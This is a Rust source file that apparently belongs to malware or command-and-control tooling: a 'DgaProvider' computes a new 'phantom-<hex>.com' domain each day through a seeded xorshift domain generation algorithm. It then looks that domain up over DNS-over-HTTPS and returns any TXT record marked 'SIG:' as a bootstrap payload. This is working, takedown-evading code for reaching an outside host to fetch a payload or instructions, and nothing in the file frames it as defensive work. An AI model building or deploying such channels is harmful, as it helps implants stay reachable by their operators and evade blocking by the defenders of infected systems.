use async_trait::async_trait;
use reqwest::Client;
use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use log::debug;
use serde::Deserialize;
use super::BootstrapProvider;

#[derive(Deserialize)]
struct DohResponse {
    #[serde(rename = "Answer")]
    answer: Option<Vec<DohAnswer>>,
}

#[derive(Deserialize)]
struct DohAnswer {
    data: String,
}

/// DGA Provider (Time-based Domain Generation)
pub struct DgaProvider {
    pub resolver_url: String,
}

impl DgaProvider {
    pub fn generate_domain(&self) -> String {
        let start = SystemTime::now();
        let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
        let seconds = since_the_epoch.as_secs();
        let day_slot = seconds / 86400;
        
        // Simple LCG/Hash compatible with Phantom/Cloud
        let seed: u64 = 0xCAFEBABE;
        let mut state = day_slot ^ seed;
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        
        format!("phantom-{:x}.com", state & 0xFFFFFF)
    }
}

#[async_trait]
impl BootstrapProvider for DgaProvider {
    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
        let domain = self.generate_domain();
        debug!("[Bootstrap] DGA Generated: {}", domain);
        
        let url = format!("{}?name={}&type=TXT", self.resolver_url, domain);
        let resp = client.get(&url).send().await?.json::<DohResponse>().await?;

        if let Some(answers) = resp.answer {
            for answer in answers {
                let raw_txt = answer.data.trim_matches('"').replace("\\\"", "\"");
                if raw_txt.contains("SIG:") {
                    return Ok(raw_txt);
                }
            }
        }
        Err(format!("No signed TXT record found for DGA {}", domain).into())
    }

    fn name(&self) -> String {
        format!("DoH-DGA(Today @ {})", self.resolver_url)
    }
}
